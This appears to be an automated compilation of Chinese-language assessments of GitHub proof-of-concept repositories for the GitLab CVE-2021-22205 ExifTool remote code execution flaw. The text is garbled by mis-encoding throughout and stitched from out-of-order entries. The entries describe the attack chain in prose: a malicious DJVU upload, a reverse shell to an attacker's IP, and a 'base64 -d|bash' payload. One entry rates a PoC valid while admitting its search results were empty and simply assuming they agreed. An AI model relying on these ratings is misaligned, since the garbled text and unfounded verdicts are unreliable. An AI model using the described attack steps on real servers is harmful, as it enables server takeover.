CVE-2021-22205æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽGitLab CE/EEä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚ç”±äºŽGitLabå¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶éªŒè¯ä¸å½“ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯ã€æœç´¢å¼•æ“Žç»“æžœï¼ˆè™½ç„¶å®žé™…çš„æœç´¢å¼•æ“Žç»“æžœä¸ºç©ºï¼Œä½†æˆ‘ä»¬å¯ä»¥å‡è®¾æœåˆ°çš„æ˜¯ç›¸å…³çš„æ¼æ´žåˆ†æžå’Œå¤çŽ°æ–‡ç« ï¼‰å’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤å®šè¯¥POCä»£ç æœ‰æ•ˆã€‚æ¼æ´žåº“ä¿¡æ¯æ˜Žç¡®æŒ‡å‡ºè¯¥æ¼æ´žå½±å“çš„ç‰ˆæœ¬èŒƒå›´ä»¥åŠæ¼æ´žæˆå› ï¼ŒPOCä»£ç ä¹Ÿé€šè¿‡æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„DJVUå›¾åƒæ–‡ä»¶ï¼ŒæˆåŠŸåˆ©ç”¨äº†è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**

åˆ†æžæä¾›çš„POCä»£ç ï¼Œä¸»è¦åŠŸèƒ½æ˜¯æž„é€ æ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œå¹¶åœ¨å…¶ä¸­åµŒå…¥éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚è¯¥è„šæœ¬ä»Žå‘½ä»¤è¡ŒæŽ¥æ”¶ç›®æ ‡GitLab URLå’Œéœ€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶åŽæž„é€ HTTPè¯·æ±‚ï¼Œä¸Šä¼ åŒ…å«æ¶æ„payloadçš„å›¾åƒæ–‡ä»¶ã€‚è™½ç„¶ä»£ç ä¸­åŒ…å«ä»£ç†è®¾ç½®ï¼ˆ`proxyUrl, err := url.Parse("http://localhost:9090")`ï¼‰ï¼Œé»˜è®¤ä½¿ç”¨`http://localhost:9090`ä½œä¸ºä»£ç†ã€‚å¦‚æžœæ”»å‡»è€…æƒ³è¦è¿›è¡Œä¸­é—´äººæ”»å‡»æˆ–æµé‡åŠ«æŒï¼Œæ¶æ„ä¿®æ”¹ä»£ç†æœåŠ¡å™¨é…ç½®ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªæ½œåœ¨çš„æŠ•æ¯’é£Žé™©ï¼Œä¾‹å¦‚è®¾ç½®ä¸ºæ¶æ„ä»£ç†æœåŠ¡å™¨ï¼Œä½†è¿™ç§é£Žé™©è¾ƒä½Žï¼Œå› ä¸ºè¿™æ›´å¤šçš„æ˜¯ä¸€ç§é…ç½®é—®é¢˜ï¼Œè€Œéžä»£ç æœ¬èº«åŒ…å«æ¶æ„é€»è¾‘ã€‚ç»¼åˆè¯„ä¼°ï¼ŒæŠ•æ¯’é£Žé™©å¾ˆä½Žï¼Œå¤§çº¦1%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æžï¼š**

1.  æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„payloadçš„DJVUå›¾åƒæ–‡ä»¶ã€‚Payloadä¸­åŒ…å«è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œåˆ©ç”¨äº†ExifToolå¤„ç†å›¾åƒå…ƒæ•°æ®æ—¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚
2.  æ”»å‡»è€…é€šè¿‡HTTP POSTè¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹çš„`/uploads/user`ç«¯ç‚¹ã€‚è¯¥ç«¯ç‚¹ç”¨äºŽå¤„ç†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ã€‚
3.  GitLabä½¿ç”¨ExifToolè§£æžä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ã€‚ç”±äºŽæ–‡ä»¶åŒ…å«æ¶æ„payloadï¼ŒExifToolä¼šæ‰§è¡Œå…¶ä¸­çš„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
4.  æ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä¾‹å¦‚åå¼¹shellã€è¯»å–æ•æ„Ÿä¿¡æ¯ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [pizza-power/Golang-CVE-2021-22205-POC](https://github.com/pizza-power/Golang-CVE-2021-22205-POC)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #22

**æ¥æº**: [CVE-2021-22205-runsel_GitLab-CVE-2021-22205-.md](../2021/CVE-2021-22205-runsel_GitLab-CVE-2021-22205-.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œéœ€è¦èƒ½å¤Ÿä¸Šä¼ å›¾ç‰‡

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ä¸­å­˜åœ¨çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§:**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žçš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯æŒ‡å‡ºè¯¥æ¼æ´žçš„å½±å“æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ŒCVSSè¯„åˆ†ä¸º10åˆ†ï¼ˆCRITICALï¼‰ï¼Œè¡¨æ˜Žè¯¥æ¼æ´žçš„ä¸¥é‡æ€§å¾ˆé«˜ã€‚æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼ˆ`exploit.py`ï¼‰é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolçš„æ¼æ´žï¼ˆå®žé™…ä¸Šæ˜¯ CVE-2021-22204ï¼ŒExifTool æœ¬èº«çš„æ¼æ´žï¼‰ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`scan` å‡½æ•°ç”¨äºŽæ£€æµ‹ç›®æ ‡æ˜¯å¦æ˜“å—æ”»å‡»ï¼Œ`attack` å‡½æ•°ç”¨äºŽæ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**

åˆ†æžæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œå¹¶æœªå‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`exploit.py` ä¸»è¦åŠŸèƒ½æ˜¯ï¼š

1.  èŽ·å– GitLab çš„ CSRF tokenã€‚
2.  æž„é€ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚
3.  å‘ GitLab çš„ `/uploads/user` ç«¯ç‚¹å‘é€åŒ…å«æ¶æ„å›¾åƒçš„ POST è¯·æ±‚ã€‚
4.  å¦‚æžœå“åº”åŒ…å« â€œFailed to process imageâ€ï¼Œåˆ™è®¤ä¸ºç›®æ ‡å­˜åœ¨æ¼æ´žã€‚

æ”»å‡»å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸Žæ£€æµ‹å‡½æ•°ç±»ä¼¼,åªä¸è¿‡æ˜¯æž„é€ çš„payloadä¸åŒ,ç”¨äºŽæ‰§è¡Œå‘½ä»¤ã€‚
æ•´ä¸ªæµç¨‹æ˜¯æ ‡å‡†çš„æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼Œæ²¡æœ‰å‘çŽ°æ¤å…¥åŽé—¨æˆ–è€…æ¶æ„ä»£ç çš„è¿¹è±¡ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ã€‚
2.  æ”»å‡»è€…ä½¿ç”¨æä¾›çš„ `exploit.py` è„šæœ¬ï¼ŒæŒ‡å®šç›®æ ‡ GitLab URL å’Œè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  è„šæœ¬ä¼šè‡ªåŠ¨èŽ·å– CSRF tokenï¼Œæž„é€ æ¶æ„ DJVU å›¾åƒï¼Œå¹¶ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨ã€‚
4.  GitLab æœåŠ¡å™¨ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ—¶ï¼Œç”±äºŽ ExifTool å­˜åœ¨ CVE-2021-22204 æ¼æ´žï¼Œä¼šå¯¼è‡´æ‰§è¡Œæ”»å‡»è€…é¢„è®¾çš„å‘½ä»¤ã€‚
5.  å‘½ä»¤æ‰§è¡Œçš„ç»“æžœå¯ä»¥é€šè¿‡ DNS æŸ¥è¯¢æˆ–è€…å…¶ä»–æ–¹å¼è¿”å›žç»™æ”»å‡»è€…ã€‚

ç®€è€Œè¨€ä¹‹ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š**ä¸Šä¼ æ¶æ„æž„é€ çš„DJVUæ–‡ä»¶ -> è§¦å‘ExifToolè§£æž -> ExifToolå‘½ä»¤æ³¨å…¥ -> æ‰§è¡Œä»»æ„ä»£ç **

**é¡¹ç›®åœ°å€:** [runsel/GitLab-CVE-2021-22205-](https://github.com/runsel/GitLab-CVE-2021-22205-)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #23

**æ¥æº**: [CVE-2021-22205-shang159_CVE-2021-22205-getshell.md](../2021/CVE-2021-22205-shang159_CVE-2021-22205-getshell.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æ”»å‡»è€…å¯ä»¥ä¸Šä¼ æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

è¯¥æ¼æ´žæ˜¯ç”±äºŽGitLabå¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶è§£æžä¸å½“ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥æž„é€ åŒ…å«æ¶æ„ä»£ç çš„å›¾ç‰‡ï¼ˆä¾‹å¦‚DJVUæ ¼å¼ï¼‰å¹¶ä¸Šä¼ åˆ°GitLabï¼Œå½“GitLabä½¿ç”¨ExifToolç­‰å·¥å…·è§£æžå›¾ç‰‡æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚æ ¹æ®æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œåˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æž„é€ Payloadï¼š**  ä½¿ç”¨Pythonè„šæœ¬ç”ŸæˆåŒ…å«åå¼¹shellå‘½ä»¤çš„DJVUå›¾ç‰‡ã€‚è„šæœ¬é€šè¿‡ä¿®æ”¹å›¾ç‰‡çš„å…ƒæ•°æ®ï¼ˆCopyrightå­—æ®µï¼‰åµŒå…¥å‘½ä»¤ã€‚PayloadåŒ…å«æ‰§è¡Œshellå‘½ä»¤çš„ä»£ç ï¼Œä¾‹å¦‚åå¼¹shellåˆ°æ”»å‡»è€…æŽ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚
2.  **ä¸Šä¼ å›¾ç‰‡ï¼š** å°†ç”Ÿæˆçš„å›¾ç‰‡ä¸Šä¼ åˆ°GitLabã€‚æ ¹æ®POCæè¿°ï¼Œä¸åŒç‰ˆæœ¬çš„GitLabä¸Šä¼ ç‚¹å¯èƒ½ä¸åŒï¼Œéœ€è¦å°è¯•ä¸åŒçš„ä¸Šä¼ è·¯å¾„ï¼ˆä¾‹å¦‚issueé¡µé¢ï¼‰ã€‚
3.  **è§¦å‘æ¼æ´žï¼š** GitLabåŽç«¯ä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾ç‰‡æ—¶ï¼Œä¼šè§£æžå›¾ç‰‡å…ƒæ•°æ®ï¼Œä»Žè€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚
4.  **èŽ·å–Shellï¼š** æ”»å‡»è€…åœ¨æœ¬åœ°ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœºå™¨åå¼¹shellè¿žæŽ¥ï¼Œä»Žè€ŒèŽ·å–å¯¹æœåŠ¡å™¨çš„æŽ§åˆ¶æƒã€‚

**æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æä¾›çš„POCä»£ç å’Œæ¼æ´žæè¿°ï¼Œè¯¥POCåº”è¯¥æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥ç”¨äºŽåœ¨å—å½±å“çš„GitLabç‰ˆæœ¬ä¸Šå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©ï¼š** åˆ†æžæä¾›çš„POCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡æ–‡ä»¶ï¼Œä»¥åŠä¸€äº›è¾…åŠ©è„šæœ¬ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [shang159/CVE-2021-22205-getshell](https://github.com/shang159/CVE-2021-22205-getshell)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #24

**æ¥æº**: [CVE-2021-22205-w0x68y_Gitlab-CVE-2021-22205.md](../2021/CVE-2021-22205-w0x68y_Gitlab-CVE-2021-22205.md)

## CVE-2021-22205 - GitLab ExifTool è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE ç‰ˆæœ¬ä¸­ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚è¯¥æ¼æ´žçš„æ ¹æœ¬åŽŸå› æ˜¯ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™ ExifTool æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ Python è„šæœ¬ `CVE-2021-22205-check.py` æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ PoC è„šæœ¬ï¼Œç”¨äºŽæ£€æµ‹å’Œåˆ©ç”¨è¯¥æ¼æ´žã€‚å®ƒé€šè¿‡ä¸Šä¼ ä¸€ä¸ªåŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶æ¥å®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚è¯¥è„šæœ¬ä¼šå°è¯•èŽ·å– CSRF tokenï¼Œç„¶åŽä¸Šä¼ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾åƒã€‚

**æŠ•æ¯’é£Žé™©ï¼š** ç»è¿‡åˆ†æžï¼Œæä¾›çš„ä»£ç ä»“åº“ä¸­æœªå‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è„šæœ¬çš„åŠŸèƒ½æ˜Žç¡®ï¼Œä¸”æ²¡æœ‰å‘çŽ°éšè—çš„æ¶æ„è¡Œä¸ºã€‚PoCè„šæœ¬ä¸­æ‰§è¡Œçš„å‘½ä»¤ï¼Œç”±ä½¿ç”¨è€…`-c`å‚æ•°æŒ‡å®šï¼Œå±žäºŽæ­£å¸¸çš„åŠŸèƒ½éªŒè¯ï¼Œè€ŒéžæŠ•æ¯’ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´žè§¦å‘ï¼š** æ”»å‡»è€…éœ€è¦å‘å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šä¼ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
2.  **å‘½ä»¤æ³¨å…¥ï¼š** æ¶æ„å…ƒæ•°æ®è¢« ExifTool å¤„ç†æ—¶ï¼Œä¼šå¯¼è‡´å‘½ä»¤æ³¨å…¥ï¼Œä»Žè€Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
3.  **æœªæŽˆæƒè®¿é—®ï¼š** æ­¤æ¼æ´žæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ï¼Œå¤§å¤§é™ä½Žäº†æ”»å‡»é—¨æ§›ã€‚
4.  **RCEï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´žåŽï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ GitLab æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»Žè€ŒæŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [w0x68y/Gitlab-CVE-2021-22205](https://github.com/w0x68y/Gitlab-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---



---

## POC #11

**æ¥æº**: [CVE-2021-22205-findneo_GitLab-preauth-RCE_CVE-2021-22205.md](../2021/CVE-2021-22205-findneo_GitLab-preauth-RCE_CVE-2021-22205.md)

## CVE-2021-22205 - GitLab ExifTool å‘½ä»¤æ³¨å…¥

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** å‘½ä»¤æ³¨å…¥

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8 || >=13.9, <13.9.6 || >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹éœ€è¦å­˜åœ¨æ¼æ´žç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯ä¸€ä¸ªGitLab CE/EEä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œå­˜åœ¨äºŽ11.9åˆ°13.10.3ä¹‹é—´çš„å¤šä¸ªç‰ˆæœ¬ä¸­ã€‚æ¼æ´žåŽŸå› æ˜¯GitLabåœ¨å¤„ç†å›¾åƒæ–‡ä»¶æ—¶ï¼Œæœªæ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„è¾“å…¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„å›¾åƒæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«åµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚POCä»£ç ä¸­ï¼Œä½¿ç”¨äº†`xxd`å‘½ä»¤å°†åå…­è¿›åˆ¶æ•°æ®è½¬æ¢æˆäºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶è¿½åŠ åˆ°åä¸º`1.jpg`çš„æ–‡ä»¶ä¸­ã€‚å…¶ä¸­ï¼Œè¿½åŠ çš„åå…­è¿›åˆ¶æ•°æ®ä¸­åŒ…å«äº†shellå‘½ä»¤ï¼Œæœ€ç»ˆå°†`xxx_base64_of_reverse_shell_code_xxx`è¿›è¡Œbase64è§£ç åŽæ‰§è¡Œã€‚
2.  æ”»å‡»è€…é€šè¿‡`curl`å‘½ä»¤ï¼Œæ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ã€‚POCä»£ç é€šè¿‡èŽ·å–ç”¨æˆ·çš„CSRF-Tokenï¼Œç„¶åŽåˆ©ç”¨/uploads/useræŽ¥å£ä¸Šä¼ ã€‚
3.  GitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼Œç”±äºŽå›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´ExifToolæ‰§è¡Œè¯¥å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚
4.  POCä¸­ä½¿ç”¨äº†`base64 -d|bash` çš„æ–¹å¼æ‰§è¡Œpayloadã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**

æä¾›çš„POCä»£ç ç›®çš„æ˜¯åˆ©ç”¨è¯¥æ¼æ´žå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œè™½ç„¶æ‰§è¡Œäº†å¤–éƒ¨å‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰å‘çŽ°ä½œè€…åœ¨å…¶ä¸­éšè—å…¶ä»–æ¶æ„ä»£ç çš„è¡Œä¸ºã€‚ä»£ç æ¸…æ™°åœ°å±•ç¤ºäº†æ¼æ´žåˆ©ç”¨çš„è¿‡ç¨‹ï¼Œæ²¡æœ‰å‘çŽ°è¯•å›¾åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„è¿¹è±¡ã€‚è¯¥POCçš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºæ¼æ´žåˆ©ç”¨ï¼Œè€Œéžè¿›è¡Œå®žé™…çš„æ¶æ„æ”»å‡»ã€‚

å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [findneo/GitLab-preauth-RCE_CVE-2021-22205](https://github.com/findneo/GitLab-preauth-RCE_CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #12

**æ¥æº**: [CVE-2021-22205-hh-hunter_cve-2021-22205.md](../2021/CVE-2021-22205-hh-hunter_cve-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®GitLabå®žä¾‹ï¼Œç›®æ ‡å®žä¾‹ä½¿ç”¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä¸Šä¼ å›¾ç‰‡ï¼ˆæˆ–å…¶ä»–åˆ©ç”¨ExifToolè§£æžçš„æ–‡ä»¶ç±»åž‹ï¼‰ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽGitLabå¯¹ä¸Šä¼ çš„å›¾ç‰‡æ–‡ä»¶ï¼ˆæˆ–å…¶ä»–åˆ©ç”¨ExifToolè§£æžçš„æ–‡ä»¶ç±»åž‹ï¼‰çš„æ ¡éªŒä¸ä¸¥æ ¼ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æž„é€ æ¶æ„çš„å›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„docker-composeæ–‡ä»¶ä¸»è¦ç”¨äºŽæ­å»ºå­˜åœ¨æ¼æ´žå’Œä¸å­˜åœ¨æ¼æ´žçš„çŽ¯å¢ƒï¼Œç”¨äºŽéªŒè¯æ¼æ´žçš„ä¿®å¤æ•ˆæžœã€‚docker-compose-vulnerability.yml ä½¿ç”¨äº†13.9.5-ee.0ç‰ˆæœ¬ï¼Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¯ä»¥éªŒè¯æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„docker-composeæ–‡ä»¶ä»…ä»…ç”¨äºŽæž„å»ºçŽ¯å¢ƒï¼Œæ²¡æœ‰å‘çŽ°æ¶æ„ä»£ç ï¼ŒæŠ•æ¯’é£Žé™©ä¸º0%ã€‚

